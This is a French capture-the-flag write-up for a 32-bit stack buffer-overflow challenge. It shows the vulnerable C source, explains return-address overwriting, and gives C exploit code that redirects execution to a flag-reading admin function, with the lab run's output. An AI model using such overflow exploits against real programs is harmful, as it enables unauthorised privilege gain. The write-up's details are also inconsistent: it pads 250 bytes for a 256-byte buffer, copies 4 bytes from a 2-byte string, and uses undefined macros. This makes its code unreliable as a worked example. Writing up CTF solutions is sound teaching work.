# Challenge pwn2 Cybernight writeup

## Description du challenge
Comme dans le challenge #1, un identifiant pour se connecter à une machine nous est fourni:
```bash
ssh ctf@10.242.0.1 -p 2223
passwd: ***
```
Et comme dans le challenge 1, on retrouve:
- *control*: ELF Executable 32bit, stripped
- *control_v2.c*: Code source de control
	-  *ctf*: 
- *flag.txt*: Fichier contenant le flag (obviously), lisible par **root**

## Analyse du code
*control_v2.c*:
```c
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define STRING_LEN 256

void select_action() {
    // User input
    char action[STRING_LEN];

    printf("### ACTION DISPATCHER ###\n");
    scanf("%s", action);

    if (!strcmp(action, "right")) {
        printf("# MOVED RIGHT\n");
    }
    else if (!strcmp(action, "left")) {
        printf("# MOVED LEFT\n");
    }
    else if (!strcmp(action, "up")) {
        printf("# MOVED UP\n");
    }
    else if (!strcmp(action, "down")) {
        printf("# MOVED DOWN\n");
    }
    else {
        printf("# UNRECOGNIZED COMMAND\n\n");
    }
}

// ADMIN section
void admin_panel() {
    printf("Bienvenue dans l'espace ADMIN !");
    setreuid(geteuid(), geteuid());
    system("/bin/bash -c 'cat ./flag.txt'");
}

int main() {
    select_action();
    return 0;
}
```
Le programme **lit un nombre indéfini de character avec scanf** depuis stdin et store la l'entrée dans le buffer *char\* action[**250**]*
On observe une fonction  *admin_panel* qui lit *flag.txt*, mais la fonction n'est pas jamais appelé.
## Exploitation
La fonction *scanf* enregistrant un nombre indéfini de character sera notre le point d'entrée pour exploiter une faille buffer overflow sur le buffer *action*.
Pour récuperer le flag, notre buffer overflow devra rediriger le programme vers la fonction *admin_panel*.

### Comment rediriger l'execution d'un programme depuis la stack ??
Tout d'abord il faut comprendre ce qu'il se passe lorsque l'intruction ``call fnc`` en assembleur est executé.

Lorsqu'une fonction est appelé, ses arguments sont poussés sur la stack dans l'ordre inverse (programme 32bit) ou les arguments sont passés par les registres (programme 64bit).

La valeur de EIP (registre contenant l'adresse de l'instruction à executer, le déroulement du programme) est *push* sur le haut de la stack avant le prélude de la fonction appelé.

Donc la valeur avant EBP (le bas de la stack de la fonction en cours d'execution) est l'adresse à que EIP prendra lorsque la fonction retournera.

Alors si on modifie [EBP + 4] (la stack va des adresses hautes, vers les adresses basse, d'où le *+*), on fera sauter l'execution de notre programme à l'adresse modifié lorsque la fonction sera terminé.
| STACK: | Size in byte |
---------|-------|
| [...] | [...] |
| RETURN ADDR | 4
| EBP (bas de la pile) | 4
| char action[] | 250

Il faut donc écrire l'adresse à laquelle nous voulons rediriger le programme: **action+254**

##  Écriture de l'exploit

Tout comme pour le premier challenge de pwn, je vais écrire un programme en *C* qui écrira notre buffer malvaillant dans un fichier. Il ne restera plus qu'à pipe l'exploit au programme.

### Définition des valeurs
Il faut commencer par savoir à quel adresse sauté, on a pas de soucis à directement la récupérer dans la liste de symbol et de l'hardcoder dans l'exploit car il n'y a pas de randomisation d'adresse.
On récupère l'adresse des symbols avec ``objdump -t ./bin``.
```bash
 faco@archad $ objdump -t ./control | grep admin
08049379 g     F .text  00000059              admin_panel
```
L'adresse de la fonction *admin_panel* est  **0x08049379**.
```c
#define PADDING 250
#define PADDING_CHAR 0x41 // on rempli le padding de 'A'
#define EBP "BB" 				// On aurait pu recouvrir EBP avec n'importe quoi
#define ADDR_LEN 4			// Une addresse en 4B long pour un programme 32bit
#define PAYLOAD "\x79\x93\x04\x08" // ADDR de la fonction admin_panel en little endian
#define TOTAL_LEN 250 + ADDR * 2
```
On construit l'exploit dans un buffer de taille *TOTAL_LEN*

```c
char* buf = (char*)malloc(TOTAL_LEN);
memset(buf, PADDING_CHAR, PADDING);
memcpy(buf+PADDING, EBP, ADDR_LEN);
memcpy(buf+PADDING+ADDR_LEN, PAYLOAD, ADDR_LEN);
```
Puis on écrit *buf* dans un fichier *evil*
```c
  FILE *f = fopen(PATH, "w");
  if (!f) {
    printf("Couldn't write file to %s\n", PATH);
    return -1;
  }
  fwrite(buf, 1, PADDING+PAYLOAD_LEN, f);
  printf("Exploit written to %s\n", PATH);
```

### Exploitation
```bash
$ ssh ctf@10.242.0.1 -p 2223 'bash -c ~/control' < evil
### ACTION DISPATCHER ###
# UNRECOGNIZED COMMAND

{FLAG}
Bienvenue dans l'espace ADMIN !
```
